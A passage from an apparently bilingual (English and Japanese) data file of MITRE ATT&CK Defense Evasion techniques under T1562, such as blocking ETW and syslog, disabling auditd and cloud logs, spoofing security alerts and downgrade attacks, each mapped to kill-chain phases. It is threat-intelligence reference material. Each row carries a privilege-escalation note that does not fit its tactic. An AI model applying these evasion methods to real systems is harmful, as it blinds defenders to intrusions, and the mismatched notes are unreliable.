Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging)

On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)

In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.

Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)

Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.006,インジケーターブロッキング,Indicator Blocking,"攻撃者は、センサーによって通常キャプチャされるインジケーターやイベントが収集・分析されるのをブロックしようとする可能性があります。これには、イベントトレースfor Windows (ETW)のようなホストベースのセンサーを悪意を持ってリダイレクトしたり(引用: Microsoft Lamin Sept 2017)、あるいはイベントテレメトリの収集とフローを制御する設定を改ざんすることによって無効にしたりすることも含まれます(引用: Microsoft About Event Tracing 2018)(引用: Medium Event Tracing Tampering 2018)。これらの設定は、構成ファイルやレジストリにシステム上に保存されたり、[PowerShell](https://attack.mitre.org/techniques/T1059/001)や[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)などの管理ユーティリティを介してアクセス可能であったりします。

例えば、攻撃者は<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code>の`File`値を変更して、悪意のあるアクションを新しいまたは別の.evtxログファイルに隠す可能性があります。このアクションはシステムの再起動を必要とせず、即座に有効になります。(引用: disable_win_evt_logging)

ETWの中断は複数の方法で達成できますが、最も直接的なのは[PowerShell](https://attack.mitre.org/techniques/T1059/001)の<code>Set-EtwTraceProvider</code>コマンドレットを使用して条件を定義するか、レジストリと直接やり取りして変更を加えることです。

ネットワークベースのインジケータ報告の場合、敵対者は報告に関連するトラフィックをブロックして中央分析を防ぐことができます。これは、テレメトリ転送を担当するローカルプロセスを停止したり、セキュリティ情報イベント管理（SIEM）製品など、イベント集約を担当する特定のホストへのトラフィックをブロックするホストベースのファイアウォールルールを作成したりするなど、多くの手段で実行できます。

Linux環境では、攻撃者はsyslogやnxlogなどのログ処理ツールを無効化または再構成して、検出および監視機能を阻害し、その後の行動を容易にする可能性があります。(引用: LemonDuck) ESXiもsyslogを利用しており、これは`esxcli system syslog config set`や`esxcli system syslog config reload`などのコマンドで再構成できます。(引用: Google Cloud Threat Intelligence ESXi VIBs 2022)(引用: Broadcom Configuring syslog on ESXi)","An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).

For example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging)

ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.

In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.

In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors. (Citation: LemonDuck) ESXi also leverages syslog, which can be reconfigured via commands such as `esxcli system syslog config set` and `esxcli system syslog config reload`.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)(Citation: Broadcom Configuring syslog on ESXi)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.012,Linux監査システムの無効化または変更,Disable or Modify Linux Audit System,"攻撃者は、悪意のあるアクティビティを隠し、検出を回避するために、Linux監査システムを無効化または変更する可能性があります。Linux管理者は、Linux監査システムを使用して、システム上のセキュリティ関連情報を追跡します。Linux監査システムはカーネルレベルで動作し、事前構成されたルールに基づいて、プロセス、ネットワーク、ファイル、ログインイベントなどのアプリケーションおよびシステムアクティビティに関するイベントログを保持します。

しばしば`auditd`と呼ばれるこれは、イベントをディスクに書き込むために使用されるデーモンの名前であり、`audit.conf`構成ファイルで設定されたパラメータによって管理されます。ログ生成ルールを構成する主な2つの方法は、コマンドラインユーティリティ`auditctl`と、起動時にロードされる`auditctl`コマンドのシーケンスを含むファイル`/etc/audit/audit.rules`です。(引用: Red Hat System Auditing)(引用: IzyKnows auditd threat detection 2022)

ルート権限があれば、攻撃者はAuditシステムサービスに関連するプロセスを強制終了するか、<code>systemctl</code>を使用してAuditサービスを停止することにより、Auditシステムサービスを無効にしたり、構成/ルールファイルを編集したり、Auditシステムライブラリ関数をフックしたりして、アクティビティがログに記録されないようにすることができます。攻撃者はまた、ロギングを無効にするためにAuditシステム関数をフックしたり、悪意のあるアクティビティを無視するように<code>/etc/audit/audit.rules</code>または<code>audit.conf</code>ファイルに含まれるルールを変更したりすることもできます。(引用: Trustwave Honeypot SkidMap 2023)(引用: ESET Ebury Feb 2014)","Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.

Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)

With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.011,セキュリティアラートの偽装,Spoof Security Alerting,"攻撃者は、ツールからのセキュリティアラートを偽装し、防御側の悪意のあるアクティビティに対する認識を損なうために偽の証拠を提示する可能性があります。(引用: BlackBasta) 防御ツールによって生成されるメッセージには、潜在的なセキュリティイベントに関する情報や、セキュリティソフトウェアおよびシステムの機能ステータスに関する情報が含まれています。セキュリティ報告メッセージは、システムの正常な動作を監視し、セキュリティインシデントを示す可能性のある重要なイベントを特定するために重要です。

[インジケーターブロッキング](https://attack.mitre.org/techniques/T1562/006)の代わりに、またはそれに加えて、攻撃者は、正当なセキュリティツールが無効にされた後でも（例：[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)）、セキュリティツールが引き続き機能しているという肯定的な確認を偽装することができます。攻撃者はまた、感染後でも「健全な」システムステータスを提示することができます。これは、防御側の対応を遅らせることにより、さらなる悪意のあるアクティビティを可能にするために悪用される可能性があります。

例えば、攻撃者は、Windows Defenderや他のシステムツールが無効にされた後、「健全な」システムステータスを持つ偽のWindowsセキュリティGUIとトレイアイコンを表示する可能性があります。(引用: BlackBasta)","Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.

Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.

For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.008,クラウドログの無効化または変更,Disable or Modify Cloud Logs,"攻撃者は、活動に関する収集データを制限し、検出を回避するために、クラウドログ機能と統合を無効化または変更する可能性があります。クラウド環境では、監査ログとアプリケーションログの収集と分析が可能であり、これによりユーザーが環境内でどのような活動を行っているかについての洞察が得られます。攻撃者が十分な権限を持っている場合、活動の検出を回避するためにログ記録を無効化または変更できます。

例えば、AWSでは、敵対者はさらなる悪意のある活動を行う前にCloudWatch/CloudTrailの統合を無効にするかもしれない。(引用：Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) あるいは、関連するSNSトピックを削除したり、複数リージョンのロギングを無効にしたり、ログファイルを検証および/または暗号化する設定を無効にしたりするなど、ロギング機能を改ざんする可能性もある。(引用：AWS Update Trail)(引用：Pacu Detection Disruption Module) Office 365では、敵対者は<code>Set-MailboxAuditBypassAssociation</code>コマンドレットを使用したり、ユーザーのM365 Advanced Auditingを無効にしたり、ユーザーのライセンスをEnterprise E5からEnterprise E3ライセンスにダウングレードしたりすることで、特定のユーザーのメール収集活動のロギングを無効にするかもしれない。(引用：Dark Reading Microsoft 365 Attacks 2021)","An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.

For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.010,ダウングレード攻撃,Downgrade Attack,"攻撃者は、時代遅れ、脆弱、および/または更新されたセキュリティ制御をサポートしていない可能性のあるシステム機能のバージョンをダウングレードまたは使用する可能性があります。ダウングレード攻撃は、通常、システムの下位互換性を利用して、より安全性の低い動作モードに強制します。

攻撃者は、[コマンドおよびスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)や、[中間者攻撃](https://attack.mitre.org/techniques/T1557)や[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)を可能にするために悪用される可能性のあるネットワークプロトコルなど、システムのさまざまな機能の安全性の低いバージョンをダウングレードして使用する可能性があります。(引用: Praetorian TLS Downgrade Attack 2014) 例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001)バージョン5以降にはスクリプトブロックロギング（SBL）が含まれており、実行されたスクリプトコンテンツを記録できます。しかし、攻撃者は、他の方法では検出された可能性のある悪意のあるスクリプトを実行中に[防御の阻害](https://attack.mitre.org/techniques/T1562)を意図して、SBLをサポートしていない以前のバージョンのPowerShellを実行しようとする可能性があります。(引用: CrowdStrike BGH Ransomware 2021)(引用: Mandiant BYOL 2018)(引用: att_def_ps_logging)

敵対者は同様に、ネットワークトラフィックを標的にして、暗号化されたHTTPS接続から、ネットワークデータを平文で公開する安全でないHTTP接続にダウングレードする可能性がある(引用: Targeted SSL Stripping Attacks Are Real)(引用: Crowdstrike Downgrade)。Windowsシステムでは、敵対者はブートマネージャーを脆弱なバージョンにダウングレードしてセキュアブートをバイパスし、様々なオペレーティングシステムのセキュリティメカニズムを無効にする能力を得る可能性がある(引用: SafeBreach)。","Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation.

Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)

Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade) On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.(Citation: SafeBreach)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

